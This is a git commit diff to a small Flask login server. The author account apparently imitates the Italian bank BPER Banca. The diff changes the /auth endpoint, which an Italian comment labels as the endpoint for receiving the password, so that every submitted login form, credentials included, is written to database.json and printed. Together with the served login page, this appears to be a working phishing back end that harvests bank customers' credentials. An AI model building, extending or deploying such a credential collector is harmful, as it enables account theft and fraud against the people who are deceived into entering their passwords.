20b929b7e1267df40616e9e4d405a17237bc3f8d
bperbanca13-stack <bper.banca13@gmail.com>
2026-03-11 14:08:59 +0100

    server.py

--- flask-login/server.py
+++ flask-login/server.py
@@ -1,13 +1,22 @@
 from flask import Flask, render_template, request, make_response
 import os
+import json
 
 app = Flask(__name__)
 
+# Endpoint per ricevere la password
 @app.route("/auth", methods=["POST"])
 def auth():
-    print(request.form.to_dict())
+    data = request.form.to_dict()  # prende i dati dal form
+    print(data)  # li stampa sulla console per debug
+
+    # Salva i dati in database.json
+    with open("database.json", "a") as f:
+        f.write(json.dumps(data) + "\n")
+
     return "ok"
 
+# Pagina login
 @app.route("/")
 def index():
     response = make_response(render_template("login.html"))
@@ -15,5 +24,5 @@ def index():
     return response
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
+    port = int(os.environ.get("PORT", 5000))  # necessario per Replit
     app.run(host="0.0.0.0", port=port)
